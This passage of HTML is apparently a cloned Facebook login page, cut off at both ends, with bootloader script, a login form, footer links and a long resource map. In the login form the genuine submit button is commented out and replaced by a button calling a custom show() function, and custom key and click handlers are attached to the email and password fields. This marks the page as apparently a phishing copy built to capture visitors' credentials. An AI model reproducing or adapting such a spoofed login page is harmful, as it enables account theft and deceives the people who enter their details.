                ["cr:1984081", [], {
                    "__rc": [null,
                        "Aa0A0g3qdgy5MiWQZhuoeS7xfZhmqzqdClyGGoV9WrWQ9bHgvMMOMT8RCU_tiLlvZW3M2AhA_WYCd63-s3ocPTPizKR1"
                    ]
                }, -1]
            ],
            "require": [
                ["markJSEnabled"],
                ["lowerDomain"],
                ["URLFragmentPrelude"],
                ["Primer"],
                ["BigPipe"],
                ["Bootloader"],
                ["TimeSlice"],
                ["AsyncRequest"],
                ["BanzaiScuba_DEPRECATED"],
                ["VisualCompletionGating"],
                ["FbtLogging"],
                ["IntlQtEventFalcoEvent"],
                ["RequireDeferredReference", "unblock", [],
                    [
                        ["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating",
                            "FbtLogging", "IntlQtEventFalcoEvent"
                        ], "sd"
                    ]
                ],
                ["RequireDeferredReference", "unblock", [],
                    [
                        ["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating",
                            "FbtLogging", "IntlQtEventFalcoEvent"
                        ], "css"
                    ]
                ]
            ]
        });
    });
    </script>
</head>
<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_en_GB" dir="ltr">
    <script type="text/javascript" nonce="SXJL9M30">
    requireLazy(["bootstrapWebSession"], function(j) {
        j(1665901728)
    })
    </script>
    <div class="_li" id="u_0_1_3y">
        <div id="globalContainer" class="uiContextualLayerParent">
            <div class="fb_content clearfix " id="content" role="main">
                <div>
                    <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
                        <div class="_8esk">
                            <div class="_8esl">
                                <div class="_8ice"><img class="fb_logo _8ilh img"
                                        src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
                                        alt="Facebook" /></div>
                                <h2 class="_8eso">Facebook helps you connect and share with the people in your life.
                                </h2>
                            </div>


                            <div class="_8esn">
                                <div class="_8iep _8icy _9ahz _9ah-">
                                    <div class="_6luv _52jv">
                                        <form class="_9vtf" data-testid="royal_login_form" action="" method="post"
                                            onsubmit="" id="u_0_2_O9"><input type="hidden" name="jazoest" value="2914"
                                                autocomplete="off" /><input type="hidden" name="lsd" value="AVpkl42Bjn4"
                                                autocomplete="off" />
                                            <div>
                                                <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy"
                                                        input onclick="changecolorU()" onkeyup="bbotton2()" id="input1"
                                                        type="text" name="username" value="" data-testid="royal_email"
                                                        placeholder="Email address or phone number" autofocus="1"
                                                        aria-label="Email address or phone number" /></div>
                                                <div class="_6lux">
                                                    <div class="_6luy _55r1 _1kbt" id="passContainer"><input
                                                            type="password" class="inputtext _55r1 _6luy _9npi"
                                                            name="password" onkeyup="bbotton()" onclick="changecolorP()"
                                                            id="input2" type="password" name="password"
                                                            data-testid="royal_pass" placeholder="Password"
                                                            aria-label="Password" />
                                                        <div class="_9ls7" id="u_0_3_Lf"><a href="#" role="button">
                                                                <div class="_9lsa">
                                                                    <div class="_9lsb" id="u_0_4_/i"></div>
                                                                </div>
                                                            </a></div>
                                                    </div>
                                                </div>
                                            </div><input type="hidden" autocomplete="off" name="login_source"
                                                value="comet_headerless_login" /><input type="hidden" autocomplete="off"
                                                name="next" value="" />
                                            <div class="_6ltg">

                                                <!--button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_5_O+">Log in stop</button-->


                                                <button onclick="show()" id="botton"
                                                    class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"><b>Log
                                                        in</b></button>

                                            </div>
                                            <div class="_6ltj"><a
                                                    href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjY1OTAxNzI4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login">Forgotten
                                                    password?</a></div>
                                            <div class="_8icz"></div>
                                            <div class="_6ltg"><a role="button"
                                                    class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="#"
                                                    ajaxify="/reg/spotlight/" id="u_0_0_Jd"
                                                    data-testid="open-registration-form-button" rel="async">Create New
                                                    Account</a></div>
                                        </form>
                                    </div>
                                    <div id="reg_pages_msg" class="_58mk"><a
                                            href="/pages/create/?ref_type=registration_form" class="_8esh">Create a
                                            Page</a> for a celebrity, brand or business.</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="">
                <div class="_95ke _8opy">
                    <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
                        <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                            <li>English (UK)</li>
                            <li><a class="_sv4" dir="ltr" href="https://bn-in.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;bn_IN&quot;, &quot;en_GB&quot;, &quot;https:\/\/bn-in.facebook.com\/&quot;, &quot;www_list_selector&quot;, 0); return false;"
                                    title="Bengali">বাংলা</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://hi-in.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;hi_IN&quot;, &quot;en_GB&quot;, &quot;https:\/\/hi-in.facebook.com\/&quot;, &quot;www_list_selector&quot;, 1); return false;"
                                    title="Hindi">हिन्दी</a></li>
                            <li><a class="_sv4" dir="rtl" href="https://ur-pk.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ur_PK&quot;, &quot;en_GB&quot;, &quot;https:\/\/ur-pk.facebook.com\/&quot;, &quot;www_list_selector&quot;, 2); return false;"
                                    title="Urdu">اردو</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://ne-np.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ne_NP&quot;, &quot;en_GB&quot;, &quot;https:\/\/ne-np.facebook.com\/&quot;, &quot;www_list_selector&quot;, 3); return false;"
                                    title="Nepali">नेपाली</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://or-in.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;or_IN&quot;, &quot;en_GB&quot;, &quot;https:\/\/or-in.facebook.com\/&quot;, &quot;www_list_selector&quot;, 4); return false;"
                                    title="Oriya">ଓଡ଼ିଆ</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://es-la.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;en_GB&quot;, &quot;https:\/\/es-la.facebook.com\/&quot;, &quot;www_list_selector&quot;, 5); return false;"
                                    title="Spanish">Español</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;en_GB&quot;, &quot;https:\/\/pt-br.facebook.com\/&quot;, &quot;www_list_selector&quot;, 6); return false;"
                                    title="Portuguese (Brazil)">Português (Brasil)</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;en_GB&quot;, &quot;https:\/\/fr-fr.facebook.com\/&quot;, &quot;www_list_selector&quot;, 7); return false;"
                                    title="French (France)">Français (France)</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;en_GB&quot;, &quot;https:\/\/de-de.facebook.com\/&quot;, &quot;www_list_selector&quot;, 8); return false;"
                                    title="German">Deutsch</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://it-it.facebook.com/"
                                    onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;en_GB&quot;, &quot;https:\/\/it-it.facebook.com\/&quot;, &quot;www_list_selector&quot;, 9); return false;"
                                    title="Italian">Italiano</a></li>
                            <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog"
                                    ajaxify="/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2F&amp;source=www_list_selector_more"
                                    href="#" title="Show more languages"><i
                                        class="img sp_g9-kC6KQ5q3 sx_3846b9"></i></a></li>
                        </ul>
                        <div id="contentCurve"></div>
                        <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
                            <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                                <li><a href="/reg/" title="Sign up for Facebook">Sign Up</a></li>
                                <li><a href="/login/" title="Log in to Facebook">Log in</a></li>
                                <li><a href="https://messenger.com/" title="Take a look at Messenger.">Messenger</a>
                                </li>
                                <li><a href="/lite/" title="Facebook Lite for Android.">Facebook Lite</a></li>
                                <li><a href="https://www.facebook.com/watch/" title="Browse our Watch videos.">Watch</a>
                                </li>
                                <li><a href="/places/" title="Take a look at popular places on Facebook.">Places</a>
                                </li>
                                <li><a href="/games/" title="Check out Facebook games.">Games</a></li>
                                <li><a href="/marketplace/"
                                        title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                                <li><a href="https://pay.facebook.com/" title="Learn more about Meta Pay"
                                        target="_blank">Meta Pay</a></li>
                                <li><a href="https://www.oculus.com/" title="Learn more about Oculus"
                                        target="_blank">Oculus</a></li>
                                <li><a href="https://portal.facebook.com/" title="Learn more about Facebook Portal"
                                        target="_blank">Portal</a></li>
                                <li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT0BRKjqJfyyhdzbtaC1JcbYuDyvIt4EN0LAk4ExAaNLA0bG5r7BxLakkbdksHWj692g7J1vP12WT_dwatsT9KmEMylBEhSw0aWkuaQv5qQAWW5nWouOpFmPs6ru00mL81fs3bC-W_QmqrJP6j7qoYf6oadQu4CnTxeeXg"
                                        title="Take a look at Instagram" target="_blank" rel="noopener nofollow"
                                        data-lynx-mode="asynclazy">Instagram</a></li>
                                <li><a href="https://www.bulletin.com/"
                                        title="Take a look at Bulletin newsletter">Bulletin</a></li>
                                <li><a href="/local/lists/245019872666104/"
                                        title="Browse our Local Lists directory.">Local</a></li>
                                <li><a href="/fundraisers/" title="Donate to worthy causes.">Fundraisers</a></li>
                                <li><a href="/biz/directory/"
                                        title="Browse our Facebook Services directory.">Services</a></li>
                                <li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                                        title="See the Voting Information Centre">Voting Information Centre</a></li>
                                <li><a href="/groups/explore/" title="Explore our groups.">Groups</a></li>
                                <li><a href="https://about.facebook.com/" accesskey="8"
                                        title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                                </li>
                                <li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
                                        title="Advertise on Facebook">Create ad</a></li>
                                <li><a href="https://www.facebook.com/pages/create/?ref_type=registration_form"
                                        title="Create a Page">Create Page</a></li>
                                <li><a href="https://developers.facebook.com/?ref=pf"
                                        title="Develop on our platform.">Developers</a></li>
                                <li><a href="/careers/?ref=pf"
                                        title="Make your next career move to our brilliant company.">Careers</a></li>
                                <li><a data-nocookies="1" href="/privacy/policy/?entry_point=facebook_page_footer"
                                        title="Learn about your privacy and Facebook.">Privacy</a></li>
                                <li><a href="/policies/cookies/" title="Learn about cookies and Facebook."
                                        data-nocookies="1">Cookies</a></li>
                                <li><a class="_41ug" data-nocookies="1"
                                        href="https://www.facebook.com/help/568137493302217"
                                        title="Learn about AdChoices.">AdChoices<i
                                            class="img sp_g9-kC6KQ5q3 sx_c924c8"></i></a></li>
                                <li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9"
                                        title="Review our terms and policies.">Terms</a></li>
                                <li><a href="/help/?ref=pf" accesskey="0" title="Visit our Help Centre.">Help</a></li>
                                <li><a href="help/637205020878504"
                                        title="Visit our contact uploading and non-users notice.">Contact uploading and
                                        non-users</a></li>
                                <li><a accesskey="6" class="accessible_elem" href="/settings"
                                        title="View and edit your Facebook settings.">Settings</a></li>
                                <li><a accesskey="7" class="accessible_elem"
                                        href="/allactivity?privacy_source=activity_log_top_menu"
                                        title="View your activity log">Activity log</a></li>
                            </ul>
                        </div>
                        <div class="mvl copyright">
                            <div><span> Meta © 2022</span></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0"
                style="display:none" /></span>
    </div>
    <div style="display:none">
        <div></div>
    </div>
    <script>
    requireLazy(["HasteSupportData"], function(m) {
        m.handle({
            "bxData": {
                "875231": {
                    "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yD\/r\/d4ZIVX-5C-b.ico"
                }
            }
        })
    });
    requireLazy(["Bootloader"], function(m) {
        m.handlePayload({
            "consistency": {
                "rev": 1006399937
            },
            "rsrcMap": {
                "8zbEZtu": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yu\/r\/G76sQY80s37.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "hKY0QKT": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yv\/r\/GG1Y0sYc7My.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "3MH7CcU": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i9Xf4\/yd\/l\/en_GB\/UdDEAn4OmnT.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "A9ciVB9": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y8\/r\/JjQFtY6i2JJ.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "X9nr65a": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3imlR4\/y4\/l\/en_GB\/OZ1Sk9h7mE6.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "PMEs\/oy": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y2\/r\/Z0QWkDr0c6_.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "FY\/FPFf": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yC\/r\/P4xg7DyaZ8c.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "lWOvGTa": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yX\/r\/zB3sm_dH2sr.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "vGt2mxz": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yg\/r\/l_dEElJiBCo.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "6qbw3PQ": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yg\/l\/0,cross\/dXxCfWsLdRu.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "BIylKC4": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/PPzsUerfBV7.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "A\/uI0x1": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ij9m4\/yQ\/l\/en_GB\/wCXZ1rLp_Gz.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "aFyazmN": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/PABGQgAce-2.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "h3ZzAmG": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/w8iOGQ_Hw3c.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "LfFe6kq": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/r\/sczXDyPA0UL.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "Z2GjVu9": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yi\/r\/1oCVuO-GKV8.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "cHw9EiA": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/r\/xTD1WqFA35l.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "2\/maQ\/Q": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/r\/mPQTxAVB7AK.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "e9ANzw\/": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iCwx4\/yG\/l\/en_GB\/zmwjHj2zb6Z.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "\/o5YvO2": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iX3c4\/yv\/l\/en_GB\/jPd4JlChcwr.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "chXwPrU": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/l\/0,cross\/ki_WOZPFQYX.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "R5w1rCJ": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yF\/r\/p55HfXW__mM.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "XJ5NO10": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/r\/qb57G6xVms3.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "P0gULGo": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/y_\/l\/en_GB\/U9i7SMcwH6s.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "oMuhfU0": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/s0fBiAtxdab.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "eMkMxHZ": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/r\/v3KFIamVEi-.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "76ZdTpL": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yi\/r\/hlVXiDcJcOn.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "CGkH4FY": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yZ\/r\/x4Eyp9nQ1uk.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "Yv35Of2": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/i7tTjMaetvp.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "wZHTkda": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/sgGXSU7K94A.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "Ufq6YWX": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/-jY7SqbZSzy.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "ZEC4RrQ": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/r\/nHDYRDL5JAA.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "tjmk+0K": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iz264\/yc\/l\/en_GB\/K2p2SXN7a9e.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "xMD047c": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iNEW4\/yI\/l\/en_GB\/gIiGNu8yf6-.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "FJvGK\/j": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/l\/0,cross\/xATmgZqFScz.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "RP11ezO": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iEbp4\/yn\/l\/en_GB\/hSX7IgOvp8c.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "q1jSZ8c": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yH\/r\/F1nWmWaBOeO.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "jQ7n\/9j": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/r\/yNYcc5eCjuy.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "m9E98Lv": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y8\/r\/oZ_UjSxsn7M.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "kKVtO2\/": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/r\/Mkv0tN0IfSu.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "ZWJ8x8U": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iBkU4\/yq\/l\/en_GB\/rF9FeVqiPZv.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "IG5yJFM": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/r\/DRl1y0jaDMY.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "KB6j3qk": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3icxi4\/yk\/l\/en_GB\/SVqId3aLKKF.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "Kug8xTf": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y_\/r\/tO0AmQMJlUq.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "5qK10mh": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yh\/r\/Ae1v-PLgN4b.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "lwT5Qxw": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yV\/r\/kOjrf0bcMT9.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "mRpDwmd": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/VRKyWyijNB9.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "cY7dHRj": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y6\/l\/0,cross\/Wd6RkB8jEqK.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "QQNFBB\/": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yf\/r\/NB_ajlyZugT.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "MSomlIN": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/l\/0,cross\/4hgSB8oLj_W.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "J+\/gBxk": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/r\/tjQ4FHZNBZI.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "RpMu8Hd": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTQy4\/yn\/l\/en_GB\/kyEANkwzttq.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "iWdauk4": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y_\/r\/iO9gEAPCw4m.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "Rl605H1": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/tyKvTuyovmn.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "ufOl4jH": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i20w4\/yF\/l\/en_GB\/5JjkZre-OdR.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "0Nf5uNX": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yO\/l\/0,cross\/YNIkX-R4dRX.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "Pd9Vjxl": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iKND4\/yE\/l\/en_GB\/M_8bpi-dxd4.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "aZWpYjE": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i14F4\/yR\/l\/en_GB\/fRGhyIjQje4.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "Lp36YXT": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yQ\/r\/w4H_1YqgpLv.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "3UeSsX3": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/l\/0,cross\/UktSgqGM7Kf.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "ORqutGC": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yR\/r\/VPzYODapoPs.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "lGsKmiB": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iW194\/yj\/l\/en_GB\/FmFiR6i99ES.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "GpQFBwL": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/B1QkyGvU3pd.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "79V9cVZ": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y9\/l\/0,cross\/qbv95oZ3elB.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "sO1pcOq": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/WC-TiDWgOFU.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "aG0dwgI": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iVIN4\/yW\/l\/en_GB\/iJymbWmGUeZ.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "5VxCd4H": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yA\/l\/0,cross\/WlwL0MSDjNm.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "DvCGkgX": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y_\/l\/0,cross\/tBfZLVYm-r3.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "zGJBAAP": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ip724\/y2\/l\/en_GB\/jrACDn_3hgP.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "uditdoq": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iPiP4\/yV\/l\/en_GB\/nRdke6nxHku.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "Vcys0\/C": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yi\/r\/zwQ2xANip4K.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "5iBhcTI": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yR\/r\/AnVpMFPdduZ.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "Ai897fY": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yH\/l\/0,cross\/e3lGUYswwx4.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "HNJlz0f": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3idBq4\/y-\/l\/en_GB\/I0hLxKscmqy.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "cYU3c32": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yC\/r\/jQFlt4gyp9R.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "jeEsBKc": {
                    "type": "css",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yX\/l\/0,cross\/uXSzIl41p-B.css?_nc_x=Ij3Wp8lg5Kz"
                },
                "dx\/AgpO": {
                    "type": "js",
                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yP\/r\/0f3OXvUFIYn.js?_nc_x=Ij3Wp8lg5Kz"
                },
                "6Wqo+6+": {
                    "type": "js",
